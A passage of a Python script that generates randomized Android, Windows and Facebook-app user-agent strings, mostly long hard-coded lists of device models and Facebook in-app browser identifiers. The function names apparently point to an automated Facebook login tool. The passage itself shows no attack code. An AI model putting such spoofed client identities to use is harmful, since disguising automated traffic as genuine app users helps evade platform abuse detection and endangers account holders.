Melody','Find Muse','Find N','Find N 5G','Find N2','lFind N2 Flip','Find N3','Find N3 Flip','Find Way S','Find X','Find X Lamborghini','Find X2','Find X2 Lite','Find X2 Pro','Find X3','Find X3 Lite','Find X3 Neo','Find X3 Pro','Find X5','Find X5 Pro','Find X6','Find X6 Pro','Find X7','Find X7 Ultra','Find X7 Ultra SE','JLAJH6','Joy Plus','K1','K10','K10 5G','K10 Pro 5G','K10x','K11 5G','K11x 5G','K12 5G','K3','K5','K7','K7x','K9 5G','K9 Pro 5G','K9s','K9x','N1 Mini','N1T','N3','Neo','Neo 3','Neo 5','Neo 7','Neo 7s','Pad 2','Pad Air','Pad Air 2','Pad Neo','Pad WiFi','R10','R1001','R11','R11 Plus','R11plus','R11s','R11s Plus','R15','R15 Dream Mirror','R15 Neo','R15 Pro','R15x','R17','R17 Neo','R17 Pro','R1K','R1L','R1S','R1x','R2001','R2010','R2017','R3006','R5','R53','R6007','R7','R7 Lite','R7 Plus','R7 Plus F','R7005','R7007','R7s','R7s Plus','R7sm','R7st','R7t','R801','R805','R807','R811','R819','R819T','R8205','R8207','R823T','R829','R829T','R830','R830S','R833T','R9','R9 Plus','R9km','R9s','R9s Plus','R9t','R9tm','Real','Reno','Reno 10','Reno 10 5G','Reno 10 Pro 5G','Reno 10 Pro+ 5G','Reno 10X','Reno 10X Zoom','Reno 11','Reno 11 Pro','Reno 12','Reno 12 5G','Reno 12 F 4G','Reno 12 F 5G','Reno 12 Pro 5G','Reno 2','Reno 2F','Reno 2Z','Reno 3','Reno 3 5G','Reno 3 Lite','Reno 3 Pro','Reno 3A','Reno 4 4G','Reno 4 5G','Reno 4 Lite','Reno 4 Pro 4G','Reno 4 Pro 5G','Reno 4 SE 5G','Reno 4F','Reno 4Z 5G','Reno 5','Reno 5 5G','Reno 5 Lite','Reno 5 Pro 5G','Reno 5 Pro Plus 5G','Reno 5A','Reno 5F','Reno 5G','Reno 5K','Reno 5K 5G','Reno 5Z','Reno 6','Reno 6 Pro','Reno 6 Pro 5G','Reno 6 Pro Plus','Reno 6 Z 5G','Reno 7','Reno 7 Pro','Reno 7 SE','Reno 7A','Reno 7Z','Reno 8','Reno 8 Pro','Reno 8 Pro+','Reno 8 Z','Reno 8T','Reno 9','Reno 9 A','Reno 9 Pro','Reno 9 Pro+','Reno A','Reno Ace','Reno Ace 2','Reno K3','Reno Z','Reno10','Reno11','Reno2','RENO3','Reno4','Reno5','Reno8','Reno9','RX17 Neo','S1','S17','S3','S4','T29','Ulike 2','V5','V8821','Watch 2 46mm','Watch 41mm','Watch 46mm','X','x20','x22','X50Pro','X54','X9017','X907','Y15','Y21','Y3','Z1'])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def jadu():
    END = '[FBAN/EMA;FBBV/16048044;FBAV/44.0.0.8.52;FBDV/Z987;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})'+END
    return ua

def iAmMethod1Ua():
    abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
    build = random.choice(abc)+random.choice(abc)+random.choice(abc)
    FBBV = str(random.randint(111111111,999999999))
    FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
    ua = random.choice(["Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDFS30.130-42-5-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/244.0.0.43.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/252.0.0.22.355;]","Mozilla/5.0 (Linux; Android 9; moto z4 Build/PDFS29.105-74-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/235.0.0.38.118;]","Mozilla/5.0 (Linux; Android 10; moto z4 Build/QDF30.130-42-5-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/348.0.0.11.110;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-23-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/359.0.0.11.81;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPPS27.91-177-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/325.0.1.4.108;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/337.0.0.7.102;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPPS27.91-177-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/290.0.0.16.119;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-177; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/217.0.0.14.121;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/223.0.0.11.121;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/240.0.0.38.121;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-143; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/219.0.0.12.120;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/286.0.0.21.122;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-87; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/192.0.0.34.85;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-143; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/218.0.0.6.119;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPPS29.55-35-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/282.0.0.10.119;]","Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play Build/OPP27.91-143; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/236.0.0.40.117;]","Mozilla/5.0 (Linux; Android 9; moto g(6) play Build/PPP29.55-35-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/281.0.0.15.120;]","Mozilla/5.0 (Linux; Android 11; TECNO CH7n Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]","Mozilla/5.0 (Linux; Android 11; TECNO CH7 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/359.0.0.11.81;]","Mozilla/5.0 (Linux; Android 11; TECNO CH7 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]"," Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]","Mozilla/5.0 (Linux; Android 12; TECNO CH7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]"," Mozilla/5.0 (Linux; Android 11; TECNO CH7 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/305.0.0.12.106;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352.0.0.14.108;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/405.0.0.16.112;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/275.0.0.14.116;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FBAN/DiscoverApp;FBAV/6.0.0.0.3;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/399.3.0.14.70;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]","Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/246.0.0.7.121;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.0.0.14.82;]","Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/419.0.0.10.49;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 10; V2029 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/353.0.0.5.112;]","Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/345.1.0.12.117;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/399.3.0.14.70;]","Mozilla/5.0 (Linux; Android 12; V2029 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/238.0.0.8.121;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]","Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.155 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]","Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.2.0.26.107;]","Mozilla/5.0 (Linux; Android 10; RMX2161 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]","Mozilla/5.0 (Linux; Android 12; RMX2163 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]","Mozilla/5.0 (Linux; Android 7.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]","Mozilla/5.0 (Linux; Android 7.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]","Mozilla/5.0 (Linux; Android 6.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 